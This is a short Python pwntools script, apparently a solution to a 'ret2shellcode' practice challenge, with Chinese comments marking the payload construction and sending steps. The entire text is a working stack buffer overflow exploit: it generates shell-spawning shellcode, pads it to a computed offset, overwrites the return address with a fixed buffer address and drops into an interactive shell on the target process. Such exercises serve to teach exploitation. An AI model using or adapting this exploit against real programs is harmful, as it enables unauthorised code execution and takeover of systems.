
from pwn import *

def main():

    sh = process('./ret2shellcode')

    buf_addr = 0x0804A080

    shellcode = asm(shellcraft.sh())

    offset = 0xffffd028 - 0xffffcfbc + 4

    ## 构造payload
    payload = shellcode.decode('unicode_escape') + \
        'A' * (offset - len(shellcode)) + \
        p32(buf_addr).decode('unicode_escape')
    print (payload)

    ## 向程序发送字符串
    sh.sendline(payload)


    sh.interactive()

if __name__ == "__main__":
    main()